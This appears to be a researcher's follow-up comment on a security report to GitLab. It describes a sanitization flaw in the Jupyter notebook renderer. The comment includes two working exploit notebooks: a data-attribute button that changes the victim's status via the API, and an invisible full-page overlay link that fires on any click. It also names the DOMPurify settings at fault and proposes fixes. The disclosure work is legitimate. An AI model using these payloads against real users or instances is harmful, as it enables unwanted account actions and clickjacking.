activities.message:
It is possible to further reduce the user interaction required to a single click with the following exploit:

```json
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "Do you want to see something?",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<button data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" data-url=\"/api/v4/user/status\">Show me!</button>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```

Compared to my initial report, the victim is only required to click on a `button` instead of changing a `select`ion. All other statements of my report still apply, though.

While I did not manage to automatically deploy the vulnerability without user interaction, I figured a way to inject `style` attributes, effectively forcing the victim to trigger the exploit.

***Note***: the following exploit is distinctive from the above. I highlight the differences between the two in the source code at the bottom, please review them carefully and fix both of them.

# How to force a victim into triggering the exploit?

Instead of using a code cell, I exploit a markdown cell as its sanitization is less restrictive than that of a code cell. In addition to `data-*` attributes, I can inject `style` as well. With that, although user interaction (e.g., a single click) is still necessary, I can effectively force the victim to execute user interaction. With `style` set to (expanded for readability):
```css
a {
  background-color: rgba(0, 0, 0, 0);
  border: 0;
  cursor: default;
  height: 100%;
  left: 0;
  position: absolute;
  top: 0;
  width: 100%;
  z-index: 1000
}
```
viewing `exploit.ipynb` creates an invisible layer that triggers the exploit on a single click. Hence, the victim does not need an incentive to interact with the malicious content but simply needs to click *anywhere* in the viewport of GitLab to trigger the exploit while viewing `exploit.ipynb`:
```json
{
  "cells": [
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": ["<a data-method=\"put\" data-params=\"message=p0wn3d\" data-remote=\"true\" href=\"/api/v4/user/status\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" />"]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.6.10",
      "mimetype": "text/x-python",
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 2
}
```

# Where do the vulnerabilities reside in the source code?

## Initial Report

The Vue component [`html.vue`](https://gitlab.com/gitlab-org/gitlab/-/blob/dc60fd7a18fcdd756bf16add91dd5aed9fb1900e/app/assets/javascripts/notebook/cells/output/html.vue) renders the output of a code cell that contains HTML. Although the component [sanitizes the HTML](https://gitlab.com/gitlab-org/gitlab/-/blob/dc60fd7a18fcdd756bf16add91dd5aed9fb1900e/app/assets/javascripts/notebook/cells/output/html.vue#L26-28) [with DOMPurify](https://gitlab.com/gitlab-org/gitlab/-/blob/dc60fd7a18fcdd756bf16add91dd5aed9fb1900e/app/assets/javascripts/notebook/cells/output/html.vue#L3):
```js
sanitizedOutput() {
  return sanitize(this.rawCode, {
    ALLOWED_ATTR: ['src'],
  });
}
```
`data-*` attributes are [*not* stripped by default](https://github.com/cure53/DOMPurify#can-i-configure-dompurify). To remedy this, configure `sanitize` as follows:
```js
sanitizedOutput() {
  return sanitize(this.rawCode, {
    ALLOWED_ATTR: ['src'],
    ALLOW_DATA_ATTR: false
  });
}
```

## Follow-Up

The Vue component [`markdown.vue`](https://gitlab.com/gitlab-org/gitlab/-/blob/dc60fd7a18fcdd756bf16add91dd5aed9fb1900e/app/assets/javascripts/notebook/cells/markdown.vue) renders the output of a markdown cell. Although the component [sanitizes the HTML](https://gitlab.com/gitlab-org/gitlab/-/blob/dc60fd7a18fcdd756bf16add91dd5aed9fb1900e/app/assets/javascripts/notebook/cells/markdown.vue#L105-160) [with DOMPurify](https://gitlab.com/gitlab-org/gitlab/-/blob/dc60fd7a18fcdd756bf16add91dd5aed9fb1900e/app/assets/javascripts/notebook/cells/markdown.vue#L4):
```js
return sanitize(marked(this.cell.source.join('').replace(/\\/g, '\\\\')), {
  // allowedTags from GitLab's inline HTML guidelines
  // https://docs.gitlab.com/ee/user/markdown.html#inline-html
  ALLOWED_TAGS: [
    'a',
    'abbr',
    'b',
    'blockquote',
    'br',
    'code',
    'dd',
    'del',
    'div',
    'dl',
    'dt',
    'em',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'hr',
    'i',
    'img',
    'ins',
    'kbd',
    'li',
    'ol',
    'p',
    'pre',
    'q',
    'rp',
    'rt',
    'ruby',
    's',
    'samp',
    'span',
    'strike',
    'strong',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'tfoot',
    'th',
    'thead',
    'tr',
    'tt',
    'ul',
    'var',
  ],
  ALLOWED_ATTR: ['class', 'style', 'href', 'src'],
});
```
`data-*` attributes are [*not* stripped by default](https://github.com/cure53/DOMPurify#can-i-configure-dompurify) and `style` attribute is retained deliberately. With the `a` tag and `href` attribute deliberately allowed as well, this approach reinforces the impact of the initial report. To remedy the issue, strip the `data-*` attributes as outlined above. However, I am not sure whether it is possible/necessary to remove the allowed attributes without impacting the existing features of the rich output.
